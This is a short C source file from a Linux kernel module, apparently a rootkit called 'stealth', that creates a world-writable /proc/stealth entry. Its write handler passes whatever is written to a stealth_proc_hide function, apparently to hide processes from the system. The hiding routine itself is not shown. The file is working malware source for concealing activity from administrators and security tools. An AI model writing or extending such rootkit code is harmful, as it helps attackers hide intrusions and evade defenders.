#include "api.h"

extern stealth_t* state;
struct file_operations handler_fops = {
    .owner = THIS_MODULE,
    .write = stealth_api_write,
};

ssize_t stealth_api_write(struct file* f, const char __user* buf, size_t len, loff_t* y) 
{
    stealth_proc_hide(buf, len-1);
    return len;
}


int stealth_api_init(void)
{
    state->proc_handler = proc_create("stealth", 0777, NULL, &handler_fops);
    if(state->proc_handler == NULL)
        return -1;
        
    return 0;
}

int stealth_api_deinit(void) 
{
    remove_proc_entry("stealth", NULL);
    return 0;
}
